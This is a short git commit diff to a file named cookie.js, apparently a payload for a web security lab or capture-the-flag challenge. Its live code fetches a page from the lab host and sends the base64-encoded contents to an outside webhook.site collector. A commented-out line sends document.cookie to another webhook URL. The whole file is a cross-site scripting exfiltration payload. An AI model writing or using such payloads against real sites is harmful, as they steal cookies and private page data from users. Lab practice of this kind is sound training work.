f34634101451b4e47a87b2b23ee4eb54fe4929b1
alakinnn <hoang2504.rmit@gmail.com>
2025-06-19 19:11:01 +0700

    a

--- cookie.js
+++ cookie.js
@@ -1,4 +1,4 @@
 // fetch('https://webhook.site/0c9edde2-c363-47be-8a34-7816750a41f5/?c=' + document.cookie)
-fetch('/current')
+fetch('https://crush.cyberjutsu-lab.tech/current')
   .then(r => r.text())
   .then(t => fetch('https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f/log?d=' + btoa(t)));
